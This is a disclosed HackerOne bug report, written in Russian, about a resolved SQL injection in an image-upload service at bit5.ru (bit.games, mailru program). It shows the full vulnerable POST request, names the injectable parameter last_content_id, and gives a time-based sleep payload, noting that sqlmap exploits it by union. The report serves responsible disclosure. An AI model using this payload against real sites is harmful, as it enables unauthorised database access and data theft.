---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '862836'
original_report_id: '862836'
title: bit.games - sql-inj
weakness: SQL Injection
team_handle: mailru
created_at: '2020-04-29T21:03:04.310Z'
disclosed_at: '2021-11-06T19:07:34.095Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: Ext. B Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- sql-injection
---

# bit.games - sql-inj

## Metadata

- HackerOne Report ID: 862836
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2021-11-06T19:07:34.095Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет комманда. У bit.games есть сервис по загрузке картинок. На нём я обнаружил sql-inj.
Домен: https://bit5.ru/

Уязвимый запрос:
```POST /filter/ajax_get_new_contents?style=icons&sort=order&ord=desc&folders=42446&last_content_id=1 HTTP/1.1
Host: bit5.ru
User-Agent: Java
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 9
Origin: http://bit5.ru
Connection: close
Referer: http://bit5.ru/filter/folder/42446
Cookie: member_id=1565; member_hash=d8965680858ff44dc1c31b3094e9a3ca

is_ajax=1```

Уязвимый параметор - last_content_id

payload: (select*from(select(sleep(20)))a)

Так-же скуля крутится скульмапом как union.

## Impact

Извлечение данных из базы  bit5.ru

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
